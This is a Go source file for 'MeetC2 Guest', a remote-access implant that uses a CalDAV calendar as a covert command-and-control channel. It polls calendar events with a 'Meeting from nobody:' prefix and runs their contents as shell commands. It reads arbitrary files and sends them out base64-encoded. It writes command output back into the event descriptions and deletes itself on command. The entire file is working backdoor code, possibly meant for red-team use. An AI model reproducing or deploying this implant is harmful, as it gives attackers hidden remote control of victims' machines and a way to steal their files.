package main

import (
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/emersion/go-webdav/caldav"
)

type Guest struct {
	service       *caldav.Client
	calendarID    string // This will be the full path to the calendar
	commandPrefix string
	hostname      string
}

// basicAuthRoundTripper is a helper to inject Basic Auth headers into requests.
type basicAuthRoundTripper struct {
	username string
	password string
	rt       http.RoundTripper
}

func (bat *basicAuthRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
	req2 := req.Clone(req.Context())
	auth := bat.username + ":" + bat.password
	req2.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(auth)))
	return bat.rt.RoundTrip(req2)
}

func main() {
	log.SetFlags(log.Ltime)

	// The calendar ID is now the full path to the calendar on the server.
	// Example: "calendars/your_username/personal/"
	calendarID := "calendars/admin/personal/" // <-- IMPORTANT: Set your calendar path here

	guest, err := NewGuest(calendarID)
	if err != nil {
		log.Fatalf("Failed to initialize: %v", err)
	}

	log.Printf("MeetC2 Guest started on %s", guest.hostname)
	log.Printf("Calendar Path: %s", guest.calendarID)
	log.Printf("Polling every 10 seconds...")

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	guest.CheckAndExecute()

	for {
		select {
		case <-ticker.C:
			guest.CheckAndExecute()
		case <-sigChan:
			return
		}
	}
}

func NewGuest(calendarID string) (*Guest, error) {
	// --- IMPORTANT: CONFIGURE YOUR NEXTCLOUD DETAILS HERE ---
	backendURL := "http://127.0.0.1/remote.php/dav/" //  URL
	username := "admin"                              // Your Nextcloud username
	appPassword := "admin"                           // An App Password generated in Nextcloud settings
	// ---------------------------------------------------------

	// Create a custom http.Client with Basic Auth
	basicAuthTransport := &basicAuthRoundTripper{
		username: username,
		password: appPassword,
		rt:       http.DefaultTransport,
	}
	httpClient := &http.Client{Transport: basicAuthTransport}

	client, err := caldav.NewClient(httpClient, backendURL)
	if err != nil {
		return nil, fmt.Errorf("failed to create CalDAV client: %v", err)
	}

	hostname, _ := os.Hostname()

	return &Guest{
		service:       client,
		calendarID:    calendarID,
		commandPrefix: "Meeting from nobody:",
		hostname:      hostname,
	}, nil
}

func (g *Guest) CheckAndExecute() {
	now := time.Now()

	timeMin := now
	timeMax := now.Add(24 * time.Hour)

	// Build a CalDAV query to find events in the next 24 hours.
	query := &caldav.CalendarQuery{
		CompFilter: caldav.CompFilter{
			Name: "VCALENDAR",
			Comps: []caldav.CompFilter{{
				Name:  "VEVENT",
				Start: timeMin, 
				End:   timeMax}},
		},
	}

	// Query the calendar. This returns events as raw iCalendar data strings.
	events, err := g.service.QueryCalendar(context.Background(), g.calendarID, query)
	if err != nil {
		log.Printf("Error listing events: %v", err)
		return
	}

	for _, eventData := range events {
		// Parse the raw iCalendar data string.
		cal := eventData.Data
		if cal == nil {
			log.Printf("Failed to decode event: %v", err)
			continue
		}

		if len(cal.Children) == 0 {
			continue
		}
		vevent := cal.Children[0]

		// Extract properties from the parsed event.
		summary, err := vevent.Props.Text("SUMMARY")
		if err != nil {
			log.Printf("Failed to get summary: %v", err)
			continue
		}
		description, _ := vevent.Props.Text("DESCRIPTION")
		uid, _ := vevent.Props.Text("UID")

		if !strings.HasPrefix(summary, g.commandPrefix) {
			continue
		}

		if strings.Contains(description, fmt.Sprintf("[OUTPUT-%s]", g.hostname)) {
			continue
		}

		// Parse command from the event summary.
		commandLine := strings.TrimSpace(strings.TrimPrefix(summary, g.commandPrefix))
		targetHost := ""
		actualCmd := commandLine

		if strings.HasPrefix(commandLine, "@") {
			parts := strings.SplitN(commandLine, ":", 2)
			if len(parts) == 2 {
				targetHost = strings.TrimPrefix(parts[0], "@")
				actualCmd = parts[1]

				if targetHost != "" && targetHost != g.hostname && targetHost != "*" {
					continue
				}
			}
		}
		cmdParts := strings.Fields(actualCmd)
		command := ""
		args := ""
		if len(cmdParts) > 0 {
			command = cmdParts[0]
		}
		if len(cmdParts) > 1 {
			args = strings.Join(cmdParts[1:], " ")
		}

		output := g.ExecuteCommand(command, args)
		g.UpdateEventWithOutput(uid, output, eventData.Path)
	}
}

func (g *Guest) ExecuteCommand(command, args string) string {
	hostInfo := fmt.Sprintf("[Host: %s]\n", g.hostname)
	log.Printf("Executing command: %s %s", command, args)

	switch command {
	case "whoami":
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME")
		}
		if user == "" {
			user = "unknown"
		}
		return hostInfo + fmt.Sprintf("User: %s\nHostname: %s\nOS: %s/%s",
			user, g.hostname, runtime.GOOS, runtime.GOARCH)

	case "pwd":
		dir, _ := os.Getwd()
		return hostInfo + dir

	case "upload":
		filepath := strings.TrimSpace(args)
		data, err := os.ReadFile(filepath)
		if err != nil {
			return hostInfo + fmt.Sprintf("Error: %v", err)
		}
		encoded := base64.StdEncoding.EncodeToString(data)
		return hostInfo + fmt.Sprintf("File: %s\n[DATA]\n%s\n[/DATA]", filepath, encoded)

	case "exit":
		go func() {
			time.Sleep(2 * time.Second)
			os.Remove(os.Args[0])
			os.Exit(0)
		}()
		return hostInfo + "Terminating..."

	default:
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/c", command+" "+args)
		} else {
			cmd = exec.Command("sh", "-c", command+" "+args)
		}

		output, err := cmd.CombinedOutput()
		if err != nil {
			return hostInfo + fmt.Sprintf("Error: %v\n%s", err, string(output))
		}
		return hostInfo + string(output)
	}
}

func (g *Guest) UpdateEventWithOutput(eventUID, output, eventPath string) error {
	// To update an event, we must fetch its current data, modify it, and PUT it back.
	// We already have the path and can fetch the object directly.
	obj, err := g.service.GetCalendarObject(context.Background(), eventPath)
	if err != nil {
		return fmt.Errorf("failed to get event object for update: %v", err)
	}

	// Parse the iCalendar data.
	cal := obj.Data
	if cal == nil {
		return fmt.Errorf("failed to decode event for update: %v", err)
	}

	// Modify the description.
	vevent := cal.Children[0]
	description, _ := vevent.Props.Text("DESCRIPTION")
	newDescription := fmt.Sprintf("%s\n\n[OUTPUT-%s]\n%s\n[/OUTPUT-%s]",
		description, g.hostname, output, g.hostname)
	vevent.Props.SetText("DESCRIPTION", newDescription)

	// PUT the modified calendar object back to the server.
	fmt.Println(output)
	_, err = g.service.PutCalendarObject(context.Background(), eventPath, cal)
	if err != nil {
		log.Printf("Failed to update event: %v", err)
	} else {
		log.Printf("Successfully updated event with output")
	}
	return err
}
